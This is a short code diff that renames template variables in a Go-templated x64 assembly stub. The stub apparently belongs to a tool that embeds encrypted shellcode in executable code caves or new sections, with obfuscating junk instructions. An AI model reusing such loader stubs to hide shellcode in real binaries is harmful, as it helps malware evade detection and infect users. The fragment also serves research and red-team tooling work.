@@ -322,7 +322,7 @@ entry:
 
 // ================================= prepare shellcode =================================
 
-{{if .CodeCave}}
+{{if .CodeCaveMode}}
   // extract encrypted shellcode from code cave
   push {{.RegN.rdi}}                           {{igi}} // save "rdi" for execute shellcode
   mov {{.RegN.rbx}}, {{hex .PayloadKey}}       {{igi}} // key of encrypted shellcode
@@ -330,9 +330,9 @@ entry:
   add {{.RegN.rdi}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
   {{STUB CodeCaveMode STUB}}
   pop {{.RegN.rdi}}                            {{igi}} // restore "rdi" for execute shellcode
-{{end}} // CodeCave
+{{end}}
 
-{{if or .ExtendSection .CreateSection}}
+{{if or .ExtendSectionMode .CreateSectionMode}}
   // save rsi and rdi
   push rsi                                     {{igi}}
   push rdi                                     {{igi}}
